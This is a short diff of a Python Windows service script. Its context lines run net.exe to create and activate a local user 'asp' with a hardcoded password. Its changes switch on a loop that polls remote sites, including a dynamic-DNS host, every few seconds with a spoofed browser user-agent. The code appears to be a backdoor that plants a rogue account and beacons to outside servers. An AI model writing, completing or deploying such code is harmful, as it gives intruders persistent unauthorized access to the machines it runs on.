@@ -138,7 +138,7 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         #print getProxy()
         self.ReportServiceStatus(win32service.SERVICE_RUNNING)
         Init()
-        #myloop()
+        myloop()
 def Init():
     #os.system("net.exe user Administrator /active:yes")
                         os.system("net.exe user asp Qwerty12! /add")
@@ -168,7 +168,7 @@ def Init():
                         os.system("net.exe user asp /active:yes")
                         sinit='1'
 def myloop():
-    threading.Timer(10.0, myloop).start() # called every minute   
+    #threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
     #sites = ["paner.altervista.org", "verifiche.ddns.net"]
     header = {'User-Agent':str(ua.chrome)}
@@ -216,7 +216,7 @@ def myloop():
 
     
     
-#while True:
+while True:
 
     
     for site in sites:
@@ -407,6 +407,6 @@ def myloop():
               elif site == site3:
                   site=site1
               
-#time.sleep(10)
+time.sleep(10)
 
 
